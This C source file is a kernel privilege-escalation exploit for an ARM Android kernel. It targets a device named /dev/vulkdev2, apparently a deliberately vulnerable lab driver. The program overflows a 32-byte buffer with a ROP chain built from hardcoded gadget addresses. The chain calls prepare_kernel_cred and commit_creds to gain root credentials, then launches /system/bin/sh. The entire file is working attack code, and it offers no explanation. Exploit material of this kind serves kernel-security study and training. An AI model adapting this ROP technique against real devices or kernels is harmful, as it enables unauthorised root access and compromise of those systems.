#include <stdlib.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>

#define VULKDEV_DEVICE "/dev/vulkdev2"
#define BUFF_SIZE 32

int main(int argc, char* argv[])
{
	int fd;
	char buf[256];
	unsigned int *pc;

	fd = open(VULKDEV_DEVICE, O_RDWR|O_NONBLOCK);
	if (fd == -1) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	memset(buf, 'A', 256);

	pc = (void *)&buf[BUFF_SIZE + 4];
	*pc++ = 0xc029414c;     // mov r0, #0; pop {r3, pc};
	*pc++ = 0x42424242;     // r3
	*pc++ = 0xc0043c58;     // <prepare_kernel_cred+4> -> pop {r3, r4, r5, pc}
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0xc00437e0;     // <commit_creds+4> -> pop {r4, r5, r6, pc}
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0xc03d1814;     // add sp, sp, #0x20; pop {r4, pc};
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0x42424242;     //
	*pc++ = 0xc000e0cc;     // <ret_fast_syscall+0xc>




	printf("getuid() = %d\n", getuid());
	write(fd, buf, 128);
	close(fd);

	printf("getuid() = %d\n", getuid());
	if (!getuid()) {
		printf("exec root shell\n");
		execl("/system/bin/sh", "sh", NULL);
	}
	return 0;
}

